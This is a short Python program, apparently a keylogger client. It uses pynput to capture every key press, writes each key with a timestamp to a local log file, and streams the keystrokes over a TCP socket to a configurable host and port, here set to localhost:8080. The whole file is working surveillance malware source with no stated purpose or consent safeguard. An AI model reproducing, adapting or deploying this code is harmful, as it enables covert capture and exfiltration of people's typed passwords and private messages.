import logging, socket
import sys
from pynput.keyboard import Key, Listener


class Connection:
    def __init__(self, host, port):
        self._host = host
        self._port = port
        self._connected = False

        self._socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    @property
    def host(self):
        return self._host

    @host.setter
    def host(self, new_host):
        self._host = new_host
    
    @property
    def port(self):
        return self._port
    
    @port.setter
    def port(self, new_port):
        self._port = new_port

    @property
    def socket(self):
        return self._socket



    def send_keys(self, keys):
        if not self._connected:
            try:
                self.socket.connect((self.host, self.port))
                self._connected = True            
                print(f"Connection established with {self.host}:{self.port}")

            except Exception as e:
                print(e)
                return

        while True:
            self.socket.send(bytes(keys, 'utf-8'))
            print("Keys sent:", keys)
            break
        


    def onPress(self, key):
        key_data = str(key)
        logging.debug(f"{key_data}")
        print(key_data)
        self.send_keys(key_data)
    
    def start(self):
        with Listener(on_press=self.onPress) as listener:
            listener.join()




if __name__ == '__main__':
    logging.basicConfig(level=logging.DEBUG, filename='client_activity.log', format='Time: %(asctime)s | Key: %(message)s')
    connection = Connection('localhost', 8080)
    connection.start()